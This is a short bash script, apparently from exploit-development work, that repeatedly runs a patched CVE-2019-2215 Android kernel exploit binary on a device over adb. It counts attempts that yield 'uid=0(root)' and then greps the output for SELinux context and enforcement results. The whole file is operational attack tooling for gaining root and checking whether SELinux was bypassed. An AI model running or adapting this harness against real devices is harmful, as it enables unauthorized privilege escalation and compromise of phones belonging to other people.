#!/bin/bash
# Retry the patched exploit on an idle, settled system and count successes.
# If it never succeeds the rebuild (not the heap, not timing) is the suspect,
# and we fall back to rebuilding from the pristine source for comparison.
set -u
N=${1:-4}
ok=0
for i in $(seq 1 "$N"); do
  UP=$(timeout 20 adb shell 'cat /proc/uptime' 2>/dev/null | awk '{print int($1)}')
  echo "############ attempt $i (uptime ${UP}s)"
  printf 'id\ncat /proc/self/attr/current\ngetenforce\n' \
    | timeout 200 adb shell /data/local/tmp/cve-2019-2215 > "/tmp/patch_$i.out" 2>&1
  if grep -q "uid=0(root)" "/tmp/patch_$i.out"; then
    echo "  >>> ROOT on attempt $i"
    ok=$((ok+1))
    cp "/tmp/patch_$i.out" /tmp/patch_success.out
    break
  fi
  echo "  failed (lines: $(wc -l < /tmp/patch_$i.out), last: $(tail -1 /tmp/patch_$i.out | cut -c1-60))"
  sleep 20
done
echo
echo "successes: $ok / $i"
if [ "$ok" -gt 0 ]; then
  echo "=========== SELINUX RESULT ==========="
  grep -nE "SID|forced|context|Enforcing|Permissive|Could not load" /tmp/patch_success.out | tail -12
fi
